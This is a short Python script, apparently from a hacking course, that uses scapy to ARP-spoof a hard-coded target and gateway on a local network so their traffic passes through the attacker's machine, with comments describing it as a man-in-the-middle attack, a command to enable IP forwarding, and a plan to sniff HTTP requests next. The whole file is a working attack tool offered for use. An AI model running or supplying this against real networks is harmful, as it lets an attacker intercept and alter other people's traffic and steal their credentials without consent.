#!/usr/bin/env python3
import time
import scapy.all as scapy



# after we use the network scanner we can get the targeted ip
# and give this function it's ip to get it's mac address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# this function to say for target that I am the router and in reverse
# the op=2 is that we will send a request not recieve one,
# pdst is the targeted machine hwdst it's mac, and psrc that i am ip router
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# restore is to free the target to connect to the real router
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.0.109"
gateway_ip = "192.168.0.1"
try:
    sent_packets_count = 0
    while True:
        sent_packets_count += 1
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print('\r[+]  Packets sent ' + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print('[+] Detected CTRL + C ..... Resetting ARP tables... Please wait.\n')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print('[+] Done restoring... ')

# in brief what this file will do is to tell the router that i am the target
# and tell the target that i am the router, so every request the target will
# request, it will be send to me and i will ask it from router. so i can
# modify request . this is men in the middle
# and when we activate this file we should type in terminal the below command
# in terminal: echo 1 > /proc/sys/net/ipv4/ip_forward
# this command is to allow the request pass by me.
# later i activate the packet sniffer so i can see the HTTP requests only
# HTTPS is not sniffed yet.
